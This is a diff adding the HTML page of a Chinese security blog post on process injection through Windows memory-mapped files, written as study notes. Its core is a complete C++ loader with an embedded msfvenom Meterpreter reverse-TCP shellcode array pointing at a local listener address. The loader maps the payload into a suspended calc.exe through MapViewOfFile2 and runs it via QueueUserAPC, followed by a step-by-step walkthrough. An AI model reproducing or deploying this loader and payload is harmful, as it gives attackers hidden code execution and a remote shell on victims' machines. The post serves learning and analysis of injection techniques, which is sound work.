@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>内存映射文件的注入方式 | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内存映射文件的注入方式</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9B%B8%E5%85%B3/">二进制相关</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>这个内容主要是最近学到了windows核心编程的第十七章内存映射文件，刚好看到雪师傅也写到了相关的文章(参考链接中标记了)，所以学习一下</p>
+<h2 id="内存映射文件"><a href="#内存映射文件" class="headerlink" title="内存映射文件"></a>内存映射文件</h2><p>书中说到windows对内存进行操作的三种机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、虚拟内存</span><br><span class="line">2、内存映射文件</span><br><span class="line">3、堆</span><br></pre></td></tr></table></figure>
+
+<p>本次讨论的就是利用内存映射文件的机制进行远程进程注入。</p>
+<p>在使用内存映射文件的时候是分三个阶段(步骤的)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、创建或者打开一个文件内核对象(CreateFile),标识了我们想要用作内存映射文件的那个磁盘文件。</span><br><span class="line">2、创建一个文件映射内核对象(CreateFileMapping),告诉系统的大小以及我们打算如何访问文件。</span><br><span class="line">3、告诉系统把文件映射对象的部分或全部映射到进程的地址空间中(MapViewOfFile)</span><br></pre></td></tr></table></figure>
+
+<p>三个步骤分别使用三个API，下面的例子中没有使用CreateFile，而是直接使用CreateFileMapping将文件映射内核对象映射到一块shellcode的地址上。</p>
+<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>这块代码说是拷贝<a href="https://idiotc4t.com/code-and-dll-process-injection/mapping-injection" target="_blank" rel="noopener">idiotc4t</a>的博客中的</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">"OneCore.lib"</span>)</span></span><br><span class="line"><span class="comment">//引用MapViewOfFile2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.254.130 lport=4444 -f c</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"</span></span><br><span class="line"><span class="string">"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"</span></span><br><span class="line"><span class="string">"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xfe\x82"</span></span><br><span class="line"><span class="string">"\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"</span></span><br><span class="line"><span class="string">"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"</span></span><br><span class="line"><span class="string">"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"</span></span><br><span class="line"><span class="string">"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"</span></span><br><span class="line"><span class="string">"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"</span></span><br><span class="line"><span class="string">"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"</span></span><br><span class="line"><span class="string">"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"</span></span><br><span class="line"><span class="string">"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"</span></span><br><span class="line"><span class="string">"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"</span></span><br><span class="line"><span class="string">"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建大小为sizeof(shellcode)的文件映射内核对象，并返回一个用来标识所创建的文件映射对象的句柄</span></span><br><span class="line">	HANDLE hMapping = CreateFileMapping(</span><br><span class="line">		INVALID_HANDLE_VALUE, <span class="comment">//使用INVALID_HANDLE_VALUE时</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">//该结构确定子进程是否可以继承返回的句柄</span></span><br><span class="line">		PAGE_EXECUTE_READWRITE, <span class="comment">//指定文件映射对象的页面保护</span></span><br><span class="line">		<span class="number">0</span>, <span class="comment">//高位文件大小</span></span><br><span class="line">		<span class="keyword">sizeof</span>(shellcode), <span class="comment">//低位文件大小</span></span><br><span class="line">		<span class="literal">NULL</span><span class="comment">//文件映射对象的名称</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将地址映射到当前进程的地址空间中，返回值为进程空间的起始地址</span></span><br><span class="line">	LPVOID lpMapAddress = MapViewOfFile(</span><br><span class="line">		hMapping, <span class="comment">//handle句柄</span></span><br><span class="line">		FILE_MAP_WRITE, <span class="comment">//对文件映射对象的访问类型</span></span><br><span class="line">		<span class="number">0</span>, <span class="comment">//高阶</span></span><br><span class="line">		<span class="number">0</span>, <span class="comment">//低阶</span></span><br><span class="line">		<span class="keyword">sizeof</span>(shellcode)<span class="comment">//映射到进程内存空间的文件映射的字节数</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将shellcode复制到当前进程的虚拟地址空间中</span></span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建calc.exe进程</span></span><br><span class="line">	CreateProcessA(</span><br><span class="line">		<span class="string">"C:\\Windows\\System32\\calc.exe"</span>, <span class="comment">//要执行的模块的名称</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">//要执行的命令行</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">//进程安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">//线程安全描述符</span></span><br><span class="line">		TRUE, <span class="comment">//决定子进程是否继承父进程句柄表中的"可继承句柄"</span></span><br><span class="line">		CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="comment">//创建的状态CREATE_SUSPENDED标识挂起的状态下创建</span></span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		(LPSTARTUPINFOA)&amp;si, <span class="comment">//pStartupInfo结构指针</span></span><br><span class="line">		&amp;pi<span class="comment">//PROCESS_INFORMATION结构的指针</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	LPVOID lpMapAddressRemote = MapViewOfFile2(</span><br><span class="line">		hMapping, <span class="comment">//createfilemapping的返回值句柄</span></span><br><span class="line">		pi.hProcess, <span class="comment">//进程句柄</span></span><br><span class="line">		<span class="number">0</span>, </span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		<span class="number">0</span>, </span><br><span class="line">		<span class="number">0</span>, </span><br><span class="line">		PAGE_EXECUTE_READ</span><br><span class="line">	);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//将lpMapAddressRemote指向的函数加入到pi.hThread(也就是calc.exe的主线程)的APC队列中</span></span><br><span class="line">	QueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(hMapping);</span><br><span class="line">	UnmapViewOfFile(lpMapAddress);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>流程分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、先使用CreateFileMapping创建一个文件映射对象，对象指向的&quot;文件&quot;大小为shellcode的长度，这里没有使用CreateFile，而是将第一个参数设置为INVALID_HANDLE_VALUE，表示告诉系统我们创建的文件映射对象的物理存储器不是磁盘上的文件，而是希望系统从页交换文件中调拨物理存储器。</span><br><span class="line">2、使用MapViewOfFile将这个对象映射到当前进程的虚拟地址空间(这里只是对地址做映射)</span><br><span class="line">3、使用memcpy将shellcode内容复制到当前的虚拟地址空间中(这里才是真的复制进去了)</span><br><span class="line">4、CreateProcess创建calc.exe进程</span><br><span class="line">5、使用MapViewOfFile2将内核中文件映射对象指向的当前进程的内存映射到calc.exe进程中，如果映射成功则返回地址目标进程中的起始地址lpMapAddressRemote</span><br><span class="line">6、通过QueueUserAPC将lpMapAddressRemote指向的函数加入到pi.hThread(也就是calc.exe的主线程)的APC队列中</span><br><span class="line">7、使用ResumeThread恢复挂起的线程(CPU给calc.exe的主线程分配时间)</span><br></pre></td></tr></table></figure>
+
+<p><code>CreateFileMapping--&gt;MapViewOfFile--&gt;memcpy--&gt;CreateProcess--&gt;MapViewOfFile2--&gt;QueueUserAPC</code></p>
+<p>下面是依靠自己的理解画的一个调用图，如果有问题可以联系我进行修改：</p>
+<p><img src="%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F.assets/mapping_inject.jpg" alt="mapping_inject"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.leanote.com/archives/snowming" target="_blank" rel="noopener">http://blog.leanote.com/archives/snowming</a><br><a href="https://idiotc4t.com/code-and-dll-process-injection/mapping-injection" target="_blank" rel="noopener">https://idiotc4t.com/code-and-dll-process-injection/mapping-injection</a><br><a href="https://hakin9.org/mapping-injection-just-another-windows-process-injection/" target="_blank" rel="noopener">https://hakin9.org/mapping-injection-just-another-windows-process-injection/</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/">反沙箱虚拟机技术</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-%E5%85%B3%E4%BA%8EATT&CK%E7%9A%84%E4%B8%80%E7%82%B9%E7%9C%8B%E6%B3%95/">关于ATT&CK的一点看法</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
